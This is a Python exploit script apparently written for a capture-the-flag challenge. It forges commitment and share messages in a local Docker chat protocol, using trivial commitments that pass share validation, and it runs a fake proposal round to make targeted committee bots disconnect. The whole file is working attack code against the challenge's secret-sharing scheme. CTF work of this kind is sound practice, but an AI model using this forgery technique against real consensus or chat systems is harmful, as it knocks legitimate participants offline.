"""Test: does forged Commitments with fake user → NGS panic → bot kill actually work?

Steps:
1. Get sheriff's committee.
2. Forge Commitments with NEW IDENT, users=[5 committee bots + fake + us].
3. Send Share DMs to set their shares.
4. Trigger Propose for NEW IDENT.
5. NUC ourselves to satisfy all_active_committed.
6. NUR ourselves.
7. Wait for Begin → NGS phase.
8. Observe whether targeted bots disconnect.
"""
import sys, os, time, subprocess, random
sys.path.insert(0, r"D:/crypto_ctf/bbbctf/the-black-talon-the-black-talon/solve")
from client import Conn, parse_msg
import proto as P

CHAN = "saloon"; PROT = "vulture"; SHERIFF = "sheriffx"
SECRET = ("XXX" * 22)[:64]


def env(): e = os.environ.copy(); e["MSYS_NO_PATHCONV"] = "1"; return e


def setup_bots(n=50):
    return subprocess.Popen(["docker", "exec", "-d", "talon-net",
        "/bin/talon/client", "--server", "127.0.0.1", "--port", "31337",
        "--channel", CHAN, "--multiple-clients", str(n)], env=env())


def launch_sheriff():
    return subprocess.Popen(["docker", "exec", "talon-net",
        "/bin/talon/client", "--server", "127.0.0.1", "--port", "31337",
        "--channel", CHAN, "--force-user", PROT, "--username", SHERIFF,
        "--secret", SECRET], env=env(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)


def reset():
    subprocess.run(["docker", "restart", "talon-net"], capture_output=True); time.sleep(1)


def wait_for_bots(c, target=50, timeout=15):
    end = time.time() + timeout
    while time.time() < end:
        c.send(f"PEEK {CHAN}")
        r = c.recv(2)
        if r and r.startswith("USERS "):
            users = r.split(" ", 1)[1].split(" ")
            if len(users) - 1 >= target:
                return users
        time.sleep(0.5)
    return None


def peek(c):
    c.send(f"PEEK {CHAN}")
    end = time.time() + 2
    while time.time() < end:
        r = c.recv(0.1)
        if r and r.startswith("USERS "):
            return r.split(" ", 1)[1].split(" ")
    return None


def main():
    reset(); setup_bots(50); time.sleep(4)
    c = Conn(); c.recv(2); c.send(f"CONNECT {PROT}")
    c.recv(2); c.send(f"JOIN {CHAN}"); c.recv(2)
    wait_for_bots(c, 50)
    sheriff = launch_sheriff()

    # Get sheriff's info
    info = {"cm": None, "sh": None}
    end = time.time() + 10
    while time.time() < end:
        ln = c.recv(0.3)
        if ln is None: continue
        m = parse_msg(ln)
        if not m: continue
        _, frm, msg = m
        if msg.startswith("COMMITMENTS"):
            info["cm"] = P.parse_commitments(msg); info["cm"]["sheriff"] = frm
        elif msg.startswith("SHARE "):
            info["sh"] = P.parse_share(msg)
        if info["cm"] and info["sh"]: break

    cm = info["cm"]; sh = info["sh"]
    q = cm["q"]; g = cm["g"]; p = 2*q+1
    print(f"[+] sheriff committee: {cm['users']}")
    print(f"[+] our key={sh['key']}")

    # Pick 5 committee bots (excluding us) as victims
    victims = [u for u in cm['users'] if u != PROT][:5]
    fake = "fakefake_zzz"
    our_ident = "ATK00001"
    forged_users = victims + [fake, PROT]
    print(f"[+] forged_users for ident={our_ident}: {forged_users}")

    # Our chosen trivial commits: c_0 = g, others = 1. Then is_share_valid(k, v): rhs = g*1*..*1 = g. Pass iff v=1.
    our_commits = [g, 1, 1, 1, 1]

    # Send forged Commitments
    cs_str = ",".join(P.b36(c_) for c_ in our_commits)
    us_str = ",".join(forged_users)
    msg = f"COMMITMENTS {our_ident} {P.b36(q)} {P.b36(g)} {cs_str} {us_str}"
    c.send(f"MSG {CHAN} {msg}")
    print(f"  ack: {c.recv(2)}")

    # Send Share DM with value=1 to each (including us)
    for u in forged_users:
        if u == fake: continue  # don't try
        share_msg = f"SHARE {our_ident} 1 1"  # key=1, value=1
        c.send(f"MSG @{u} {share_msg}")
        ack = c.recv(0.5)
        # print(f"  share to {u}: ack={ack}")
    time.sleep(0.5)
    # Drain
    while c.recv(0.05) is not None: pass

    # Send Propose for our ident
    nonce = random.randint(1, 2**32 - 2)
    c.send(f"MSG {CHAN} RECOMM {our_ident} {nonce} PROPOSE")
    print(f"[+] sent Propose nonce={nonce}, ack={c.recv(2)}")

    # We NUC immediately with random s
    our_s = random.randint(0, (1<<64)-1)
    our_commit = pow(g, our_s, q)
    c.send(f"MSG {CHAN} RECOMM {our_ident} {nonce} NUC {P.b36(our_commit)}")
    print(f"[+] we NUC s={our_s}, ack={c.recv(2)}")

    # Wait for NUC + NUR from bots
    nurs = {}; commits = {}
    end = time.time() + 5
    while time.time() < end:
        ln = c.recv(0.2)
        if ln is None: continue
        m = parse_msg(ln)
        if not m: continue
        _, frm, msg = m
        if msg.startswith(f"RECOMM {our_ident} {nonce}"):
            parts = msg.split(" ", 4)
            sub = parts[3]
            if sub == "NUC":
                commits[frm] = parts[4]
                # print(f"  [{frm}] NUC")
            elif sub == "NUR":
                try: nurs[frm] = int(parts[4].strip())
                except: pass
                # print(f"  [{frm}] NUR")
    print(f"[+] after waiting: commits={len(commits)} nurs={len(nurs)}")

    # We NUR
    c.send(f"MSG {CHAN} RECOMM {our_ident} {nonce} NUR {our_s}")
    print(f"  we NUR, ack={c.recv(2)}")

    # Wait for Begin + NGS phase
    print(f"[+] waiting 10s for Begin + NGS + PANIC...")
    begins = []; ngs = []
    end = time.time() + 10
    while time.time() < end:
        ln = c.recv(0.3)
        if ln is None: continue
        m = parse_msg(ln)
        if not m: continue
        _, frm, msg = m
        if msg.startswith(f"RECOMM {our_ident} {nonce}"):
            parts = msg.split(" ", 4)
            sub = parts[3]
            if sub == "BEGIN":
                begins.append((frm, parts[4]))
                print(f"  [BEGIN] from {frm}: {parts[4][:60]}")
            elif sub == "NGS":
                ngs.append((frm, parts[4]))
            else:
                print(f"  [{sub}] from {frm}: {parts[4][:60] if len(parts)>4 else ''}")

    print(f"[+] Begins: {len(begins)}, NGS: {len(ngs)}")

    # Check if victims are dead
    time.sleep(2)
    users_now = peek(c)
    print(f"\n[+] After attack, users in channel: {len(users_now)}")
    print(f"  victims status:")
    for v in victims:
        alive = v in users_now
        print(f"    {v}: {'ALIVE' if alive else '*** DEAD ***'}")
    print(f"  us alive: {PROT in users_now}")
    print(f"  sheriff: {cm['sheriff'] in users_now}")

    c.send("GOODBYE"); c.close()
    sheriff.terminate(); sheriff.wait()


if __name__ == "__main__":
    main()
